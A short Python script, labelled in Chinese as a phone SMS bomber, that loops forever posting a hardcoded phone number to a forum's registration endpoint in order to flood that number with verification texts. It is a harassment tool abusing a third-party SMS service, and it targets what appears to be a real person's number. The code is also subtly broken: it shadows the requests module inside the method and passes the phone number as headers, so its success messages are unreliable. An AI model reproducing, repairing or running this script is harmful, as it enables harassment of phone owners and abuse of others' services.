#!/usr/bin/env python
#####手机轰炸短信#####

import requests
import time
import json

class SMSsend_one(object):
    "载入短信接口"
    def __init__(self,mobile):
        self.url = "http://bbs.mydigit.cn/registe.php"
        self.header = {
            "Referer":"http: // bbs.mydigit.cn / registe.php",
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko)Chrome / 69.0.3497.81Safari / 537.36'
        }
        self.mobile=mobile
    def  get_response(self):
        data = {
            "action": "auth",
            "step":"1",
            "mobile":self.mobile
        }
        try:
            requests = requests.post(url=self.url,
                                     data=data,
                                     headers=self.mobile
                                     )
            print("{}:{}>>>>>>>发送成功".format(self.url,self.mobile))
        except Exception:
            print("{}:{}>>>>>>>发送失败".format(self.url,self.mobile))

    def run(self):
        self.get_response()

if __name__ == "__main__":
    while 1:
        moblie = "18701709702"
        one = SMSsend_one(moblie)
        one.run()